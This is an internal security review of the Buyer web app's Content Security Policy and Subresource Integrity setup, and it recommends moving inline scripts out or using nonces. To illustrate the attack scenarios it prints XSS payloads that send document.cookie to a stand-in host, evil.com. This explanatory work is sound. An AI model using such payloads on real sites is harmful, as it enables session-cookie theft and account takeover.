# Security Analysis: CSP and SRI

This document provides a comprehensive analysis of Content Security Policy (CSP) and Subresource Integrity (SRI) issues in the Buyer application, with recommendations for production deployment.

**Status:** [!] Non-critical - Can be addressed when preparing for production deployment

---

## Table of Contents

1. [What are CSP and SRI?](#what-are-csp-and-sri)
2. [Current Security Posture](#current-security-posture)
3. [Identified Issues](#identified-issues)
4. [Attack Scenarios](#attack-scenarios)
5. [Recommended Solutions](#recommended-solutions)
6. [Implementation Guide](#implementation-guide)
7. [Priority and Timeline](#priority-and-timeline)

---

## What are CSP and SRI?

### Content Security Policy (CSP)

**Content Security Policy** is an HTTP header that tells browsers what content is allowed to load on your web page. It's a defense-in-depth mechanism against XSS (Cross-Site Scripting) attacks.

**How it works:**
```http
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

This tells the browser:
- [x] Load scripts from same origin (`'self'`)
- [x] Load scripts from `https://trusted-cdn.com`
- [X] Block all other scripts (inline, other domains, data: URIs)

**Benefits:**
- Blocks injected malicious scripts even if XSS vulnerability exists
- Second layer of defense (defense-in-depth)
- Prevents compromised dependencies from executing

### Subresource Integrity (SRI)

**Subresource Integrity** ensures that files fetched from CDNs haven't been tampered with using cryptographic hashes.

**How it works:**
```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

If the CDN is compromised and serves different content:
- Browser calculates hash of downloaded file
- Compares with `integrity` attribute
- If mismatch → **Script blocked, site protected**

---

## Current Security Posture

### Good News [x]

1. **Using Local Scripts**: Application already serves all JavaScript/CSS from embedded static files
   - `htmx.min-2.0.8.js`
   - `vega.min.js`
   - `vega-lite.min.js`
   - `vega-embed.min.js`
   - All embedded in Go binary via `web/embed.go`

2. **No External CDN Dependencies**: No actual references to CDNs in HTML templates

3. **HTML Escaping**: All error messages and dynamic content properly escaped

### Issues [!]

1. **Permissive CSP Header**: Allows unsafe directives that weaken security
2. **Inline Scripts**: Multiple templates contain inline `<script>` blocks
3. **Inconsistent Policy**: CSP lists CDNs that aren't actually used

---

## Identified Issues

### Issue 1: Unsafe CSP Directives

**Location:** `cmd/buyer/web_security.go` line 38

**Current CSP:**
```javascript
"default-src 'self';
 script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com https://cdn.jsdelivr.net;
 style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
 img-src 'self' data:;
 connect-src 'self';"
```

**Problems:**

#### 1. `'unsafe-inline'` in script-src
**Severity:** HIGH

Allows inline JavaScript to execute:
```html
<!-- This would be allowed: -->
<input value="user data" onload="alert('XSS')">
<script>fetch('https://evil.com/steal?data=' + document.cookie)</script>
```

**Impact:**
- If XSS vulnerability exists, attacker can inject and execute scripts
- Defeats the primary purpose of CSP
- Makes CSP mostly useless as a security boundary

**Why it's there:** Application has inline scripts in templates

#### 2. `'unsafe-eval'` in script-src
**Severity:** MEDIUM

Allows `eval()` and related functions:
```javascript
eval(userInput);  // Dangerous if userInput is attacker-controlled
new Function(userInput)();
setTimeout("alert('xss')", 1000);
```

**Impact:**
- Allows code generation from strings
- Can lead to arbitrary code execution if combined with injection vulnerability
- Modern applications shouldn't need this

**Why it's there:** Unclear - application doesn't appear to use `eval()`

#### 3. Listed CDNs Not Actually Used
**Severity:** LOW

Lists `https://unpkg.com` and `https://cdn.jsdelivr.net` but application doesn't load from them.

**Impact:**
- Confusing security policy
- If someone accidentally adds CDN script without SRI, it would be allowed
- Unnecessarily expands attack surface

### Issue 2: Inline Scripts in Templates

**Locations:** Found in multiple template files

**Examples:**

`web/templates/brands.html` (line 57):
```html
<script>
function toggleEdit(id) {
    const row = document.getElementById('brand-' + id);
    const nameSpan = row.querySelector('.brand-name');
    const form = row.querySelector('.edit-form');
    // ... more code
}
</script>
```

`web/templates/dashboard.html` (line 66):
```html
<script>
    // Chart rendering code
    vegaEmbed('#spending-chart', spec);
</script>
```

**Files with inline scripts:**
- `brands.html`
- `dashboard.html`
- `products.html`
- `project-dashboard.html` (multiple)
- `project-detail.html`
- `projects.html`
- `requisitions.html`
- `specifications.html`

**Why this matters:**
- These scripts require `'unsafe-inline'` to function
- Can't remove `'unsafe-inline'` without moving these scripts
- Each inline script is a potential injection point if template rendering has bugs

---

## Attack Scenarios

### Scenario 1: XSS via Template Injection

**Precondition:** Template rendering bug or missed escaping

**Attack:**
```
1. Attacker injects: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
2. Due to 'unsafe-inline', browser executes the onerror handler
3. Attacker steals session cookie
4. Attacker gains unauthorized access
```

**With proper CSP (no 'unsafe-inline'):**
```
1. Same injection attempt
2. Browser blocks inline event handler
3. Attack fails, user protected
```

### Scenario 2: CDN Compromise (Hypothetical)

**If application switched to using CDNs without SRI:**

```html
<!-- Vulnerable -->
<script src="https://cdn.jsdelivr.net/npm/library.js"></script>
```

**Attack:**
1. CDN account compromised or DNS hijacked
2. Attacker replaces `library.js` with malicious code
3. All users load compromised script
4. Widespread data theft

**With SRI:**
```html
<!-- Protected -->
<script
  src="https://cdn.jsdelivr.net/npm/library.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
</script>
```

**Defense:**
1. CDN compromised, serves malicious file
2. Browser calculates hash of downloaded file
3. Hash doesn't match `integrity` attribute
4. Browser blocks script, users protected

**Note:** This is NOT a current risk since application uses local scripts.

### Scenario 3: Compromised Dependency in Build Pipeline

**More realistic threat:**

```
1. Attacker compromises npm package used in build (e.g., htmx)
2. Malicious code added to htmx.min.js during npm install
3. Malicious version embedded in Go binary
4. Deployed to production
5. All users affected
```

**Mitigation strategies:**
- Lock dependencies with package-lock.json / yarn.lock
- Use npm audit / Snyk to scan for vulnerabilities
- Verify checksums of downloaded dependencies
- Use SRI if switching to CDN delivery
- Consider vendoring dependencies and reviewing code

---

## Recommended Solutions

### Solution 1: Move Inline Scripts to External Files (Recommended)

**Advantages:**
- [x] Simplest to implement
- [x] Works with embedded static files
- [x] No template changes needed (minimal)
- [x] No per-request overhead (no nonce generation)
- [x] Scripts cached by browser
- [x] Can remove `'unsafe-inline'` entirely

**Disadvantages:**
- [!] Requires refactoring existing inline scripts
- [!] Need to ensure proper script loading order
- [!] More files to manage

**Implementation steps:**
1. Create individual JS files for each page's inline scripts
2. Move inline code to these files
3. Reference from templates with `<script src="/static/js/page.js">`
4. Update CSP to remove `'unsafe-inline'`
5. Test all functionality

**Example:**

Create `web/static/js/brands.js`:
```javascript
function toggleEdit(id) {
    const row = document.getElementById('brand-' + id);
    const nameSpan = row.querySelector('.brand-name');
    const form = row.querySelector('.edit-form');
    const editBtn = row.querySelector('.secondary');

    if (form.classList.contains('hidden')) {
        nameSpan.classList.add('hidden');
        form.classList.remove('hidden');
        editBtn.textContent = 'Save';
        editBtn.onclick = function() {
            htmx.trigger(form, 'submit');
        };
    } else {
        nameSpan.classList.remove('hidden');
        form.classList.add('hidden');
        editBtn.textContent = 'Edit';
        editBtn.onclick = function() {
            document.getElementById('brand-' + id).querySelector('.brand-name');
        };
    }
}
```

Update `web/templates/brands.html`:
```html
<!-- Remove inline <script> block -->

<!-- Add at end of template: -->
<script src="/static/js/brands.js"></script>
```

Update CSP in `cmd/buyer/web_security.go`:
```go
c.Set("Content-Security-Policy",
    "default-src 'self'; "+
    "script-src 'self'; "+  // Removed 'unsafe-inline' and 'unsafe-eval'
    "style-src 'self' 'unsafe-inline'; "+  // Keep for inline styles if needed
    "img-src 'self' data:; "+
    "connect-src 'self';")
```

### Solution 2: Use CSP Nonces (More Flexible)

**Advantages:**
- [x] Keeps inline scripts in templates
- [x] Still secure (each nonce is unique per request)
- [x] More flexible for dynamic content
- [x] No need to extract scripts

**Disadvantages:**
- [!] More complex implementation
- [!] Per-request overhead (nonce generation)
- [!] Must update all template script tags
- [!] Nonce must be passed to all templates

**Implementation:**

Update `cmd/buyer/web_security.go`:
```go
import "crypto/rand"

func generateCSPNonce() string {
    b := make([]byte, 16)
    if _, err := rand.Read(b); err != nil {
        panic(fmt.Sprintf("failed to generate CSP nonce: %v", err))
    }
    return base64.StdEncoding.EncodeToString(b)
}

// In middleware
app.Use(func(c *fiber.Ctx) error {
    nonce := generateCSPNonce()
    c.Locals("csp_nonce", nonce)

    csp := fmt.Sprintf(
        "default-src 'self'; "+
        "script-src 'self' 'nonce-%s'; "+  // Only scripts with this nonce
        "style-src 'self' 'unsafe-inline'; "+
        "img-src 'self' data:; "+
        "connect-src 'self';",
        nonce,
    )
    c.Set("Content-Security-Policy", csp)
    return c.Next()
})
```

Update template rendering to pass nonce:
```go
// In web handlers
func handleBrandsPage(c *fiber.Ctx) error {
    nonce := c.Locals("csp_nonce").(string)

    return c.Render("brands", fiber.Map{
        "Title": "Brands",
        "CSPNonce": nonce,
        // ... other data
    })
}
```

Update templates:
```html
<!-- Before -->
<script>
function toggleEdit(id) { ... }
</script>

<!-- After -->
<script nonce="{{.CSPNonce}}">
function toggleEdit(id) { ... }
</script>
```

### Solution 3: Hybrid Approach

**Best of both worlds:**

1. **Move reusable functions** to external files:
   - `toggleEdit()`, `deleteRow()`, etc.
   - Shared utilities

2. **Keep page-specific initialization** inline with nonces:
   - Chart data rendering
   - Page-specific configuration

**Example:**

`web/static/js/common.js`:
```javascript
// Reusable functions
function toggleEdit(id) { ... }
function deleteRow(id, endpoint) { ... }
function confirmDelete(message) { ... }
```

`web/templates/brands.html`:
```html
<script src="/static/js/common.js"></script>

<!-- Page-specific initialization with nonce -->
<script nonce="{{.CSPNonce}}">
    // Initialize page-specific behavior
    document.addEventListener('DOMContentLoaded', function() {
        // Chart rendering with dynamic data from backend
        vegaEmbed('#chart', {{.ChartData}});
    });
</script>
```

---

## Implementation Guide

### Phase 1: Audit and Planning (1 day)

1. **Inventory all inline scripts:**
   ```bash
   grep -rn "<script>" web/templates/ > inline-scripts-audit.txt
   ```

2. **Categorize scripts:**
   - Reusable functions (can be extracted)
   - Page-specific initialization (may need nonces)
   - Chart rendering (contains dynamic data)

3. **Choose approach:**
   - External files (simpler, recommended)
   - Nonces (more flexible)
   - Hybrid (best long-term)

### Phase 2: Implementation (2-3 days)

#### Option A: External Files Approach

**Step 1: Create script directory structure**
```
web/static/js/
├── htmx.min-2.0.8.js (existing)
├── vega.min.js (existing)
├── common.js (new - shared utilities)
├── brands.js (new)
├── products.js (new)
├── dashboard.js (new)
├── requisitions.js (new)
└── ... (one per page with inline scripts)
```

**Step 2: Extract inline scripts**

For each template with inline scripts:
1. Copy inline code to corresponding JS file
2. Ensure proper scoping (wrap in IIFE if needed)
3. Replace inline `<script>` with `<script src="...">`

Example for `brands.html`:
```javascript
// web/static/js/brands.js
(function() {
    'use strict';

    window.toggleEdit = function(id) {
        const row = document.getElementById('brand-' + id);
        // ... implementation
    };

    // Page initialization
    document.addEventListener('DOMContentLoaded', function() {
        console.log('Brands page loaded');
    });
})();
```

**Step 3: Update templates**
```html
{{define "content"}}
<!-- existing content -->

<!-- Remove inline <script> blocks -->

<!-- Add external script reference at end -->
<script src="/static/js/brands.js"></script>
{{end}}
```

**Step 4: Update CSP**
```go
// cmd/buyer/web_security.go line 38
c.Set("Content-Security-Policy",
    "default-src 'self'; "+
    "script-src 'self'; "+  // Removed 'unsafe-inline', 'unsafe-eval', and CDNs
    "style-src 'self' 'unsafe-inline'; "+
    "img-src 'self' data:; "+
    "connect-src 'self';")
```

**Step 5: Test thoroughly**
- Test each page functionality
- Check browser console for CSP violations
- Verify no inline scripts executing
- Test with CSP reporting (see monitoring section)

#### Option B: Nonce Approach

**Step 1: Implement nonce generation**
```go
// cmd/buyer/web_security.go
func generateCSPNonce() string {
    b := make([]byte, 16)
    if _, err := rand.Read(b); err != nil {
        panic(fmt.Sprintf("failed to generate CSP nonce: %v", err))
    }
    return base64.StdEncoding.EncodeToString(b)
}
```

**Step 2: Add middleware to generate and set nonce**
```go
// In SetupSecurityMiddleware
app.Use(func(c *fiber.Ctx) error {
    nonce := generateCSPNonce()
    c.Locals("csp_nonce", nonce)

    csp := fmt.Sprintf(
        "default-src 'self'; "+
        "script-src 'self' 'nonce-%s'; "+
        "style-src 'self' 'unsafe-inline'; "+
        "img-src 'self' data:; "+
        "connect-src 'self';",
        nonce,
    )
    c.Set("Content-Security-Policy", csp)
    return c.Next()
})
```

**Step 3: Update all handlers to pass nonce**
```go
// Example: web_handlers.go
func (h *Handler) BrandsPage(c *fiber.Ctx) error {
    nonce, _ := c.Locals("csp_nonce").(string)

    brands, err := h.brandSvc.GetAll(100, 0)
    if err != nil {
        return err
    }

    return c.Render("brands", fiber.Map{
        "Title": "Brands",
        "Brands": brands,
        "CSPNonce": nonce,  // Pass to template
    })
}
```

**Step 4: Update all inline scripts in templates**
```html
<!-- Before -->
<script>
function toggleEdit(id) { ... }
</script>

<!-- After -->
<script nonce="{{.CSPNonce}}">
function toggleEdit(id) { ... }
</script>
```

**Step 5: Test and verify**

### Phase 3: Testing and Validation (1 day)

#### 1. Enable CSP Reporting (Recommended)

Add report-uri to CSP:
```go
csp := fmt.Sprintf(
    "default-src 'self'; "+
    "script-src 'self'; "+
    "style-src 'self' 'unsafe-inline'; "+
    "img-src 'self' data:; "+
    "connect-src 'self'; "+
    "report-uri /csp-report;",  // Add reporting endpoint
)
```

Implement report handler:
```go
app.Post("/csp-report", func(c *fiber.Ctx) error {
    var report map[string]interface{}
    if err := c.BodyParser(&report); err != nil {
        return err
    }

    slog.Warn("CSP violation reported",
        slog.Any("report", report),
        slog.String("user_agent", c.Get("User-Agent")),
        slog.String("ip", c.IP()))

    return c.SendStatus(204)
})
```

#### 2. Browser Testing

Test in multiple browsers:
- Chrome/Edge (Blink engine)
- Firefox (Gecko engine)
- Safari (WebKit engine)

Check for:
- CSP violations in console
- Functionality works correctly
- No broken features

#### 3. Automated Testing

Add CSP validation to tests:
```go
func TestCSPHeader(t *testing.T) {
    app := setupTestApp(t)

    resp, err := app.Test(httptest.NewRequest("GET", "/", nil))
    require.NoError(t, err)

    csp := resp.Header.Get("Content-Security-Policy")
    assert.Contains(t, csp, "script-src 'self'")
    assert.NotContains(t, csp, "'unsafe-inline'")
    assert.NotContains(t, csp, "'unsafe-eval'")
}
```

### Phase 4: Monitoring (Ongoing)

After deployment, monitor CSP violations to catch:
- Missed inline scripts
- New code introducing violations
- Legitimate third-party integrations that need whitelisting

---

## Priority and Timeline

### Priority: MEDIUM (Not Blocker)

**Current security posture:**
- [x] HTML escaping implemented
- [x] No external CDN dependencies
- [x] Input validation in place
- [x] CSRF tokens cryptographically secure
- [x] Authentication with bcrypt
- [!] CSP is permissive but application is otherwise secure

**When to address:**
- Before marketing as "security-focused"
- Before handling sensitive data
- Before multi-tenant deployment
- When preparing for security audit
- As part of production hardening

**Can wait until:**
- After implementing core features (PO tracking, multi-user)
- After achieving feature completeness
- When planning production deployment

### Recommended Timeline

**Option 1: External Files (Recommended)**
- Week 1: Audit and extract scripts (2 days)
- Week 1: Update CSP and test (1 day)
- Week 1: Deploy and monitor (2 days)
- **Total: 1 week**

**Option 2: Nonces**
- Week 1: Implement nonce system (2 days)
- Week 1: Update all templates (2 days)
- Week 1: Test and deploy (1 day)
- **Total: 1 week**

### Effort Estimate

- **Developer time:** 2-3 days
- **Testing time:** 1 day
- **Total:** 3-4 days
- **Risk:** Low (non-breaking change with proper testing)

---

## Additional Recommendations

### 1. Remove Unused CSP Directives

Update CSP to reflect actual usage:

**Current (confusing):**
```javascript
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com https://cdn.jsdelivr.net"
```

**Recommended (clear):**
```javascript
"script-src 'self'"
```

### 2. Consider Stricter Policies for Production

For production deployment, consider:

```javascript
"default-src 'none'; "+                    // Deny all by default
"script-src 'self'; "+                     // Only our scripts
"style-src 'self' 'unsafe-inline'; "+      // Styles (inline needed for Pico CSS)
"img-src 'self' data:; "+                  // Images from our server + data URIs
"font-src 'self'; "+                       // Fonts from our server
"connect-src 'self'; "+                    // AJAX to same origin only
"form-action 'self'; "+                    // Forms submit to same origin
"base-uri 'self'; "+                       // Prevent <base> tag hijacking
"frame-ancestors 'none'; "+                // Prevent clickjacking
"upgrade-insecure-requests; "+             // Force HTTPS
"block-all-mixed-content;"                 // Block HTTP resources on HTTPS page
```

### 3. Add CSP to CLAUDE.md

Document CSP policy in developer guide:
```markdown
### Content Security Policy

The application enforces strict CSP:
- Scripts: Only from same origin
- Styles: Same origin + inline (for Pico CSS)
- Images: Same origin + data URIs
- No external CDNs used

When adding new scripts, they must be:
1. Placed in `web/static/js/`
2. Added to `web/embed.go` if new directory
3. Referenced with relative paths
```

### 4. Regular Security Audits

Schedule periodic reviews:
- Quarterly CSP policy review
- Check for new inline scripts in PRs
- Monitor CSP violation reports
- Update policies as application evolves

---

## References and Further Reading

### Official Documentation
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
- [OWASP: Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

### Tools
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Evaluate your CSP policy
- [SRI Hash Generator](https://www.srihash.org/) - Generate SRI hashes for resources
- [Report URI](https://report-uri.com/) - CSP reporting service

### CSP Directive Reference

| Directive | Purpose | Example |
|-----------|---------|---------|
| `default-src` | Fallback for other directives | `'self'` |
| `script-src` | Controls script sources | `'self' 'nonce-abc123'` |
| `style-src` | Controls stylesheet sources | `'self' 'unsafe-inline'` |
| `img-src` | Controls image sources | `'self' data:` |
| `connect-src` | Controls fetch/XHR/WebSocket | `'self'` |
| `font-src` | Controls font sources | `'self'` |
| `frame-src` | Controls iframe sources | `'none'` |
| `form-action` | Controls form submission URLs | `'self'` |

### CSP Keywords

| Keyword | Meaning | Security Impact |
|---------|---------|-----------------|
| `'none'` | Block all sources | [x] Most secure |
| `'self'` | Same origin only | [x] Secure |
| `'unsafe-inline'` | Allow inline scripts/styles | [X] Dangerous |
| `'unsafe-eval'` | Allow eval() | [X] Dangerous |
| `'nonce-{value}'` | Allow script with matching nonce | [x] Secure |
| `'strict-dynamic'` | Trust scripts loaded by trusted scripts | [!] Moderate |

---

## Conclusion

**Current Status:**
- Application is reasonably secure with proper HTML escaping and authentication
- CSP is permissive but not actively exploitable given current architecture
- No SRI concerns (using local scripts, not CDNs)

**Recommended Action:**
- Address CSP when preparing for production deployment
- Prioritize after core feature development
- Estimated effort: 3-4 days
- Risk: Low
- Impact: Improved defense-in-depth

**Bottom Line:**
This is not a blocker for development or initial deployment, but should be addressed before:
- Marketing application as secure
- Processing sensitive data
- External security audit
- Compliance requirements (SOC 2, ISO 27001)

The good news is that the application already uses local scripts, so implementing proper CSP is straightforward and doesn't require dependency changes.
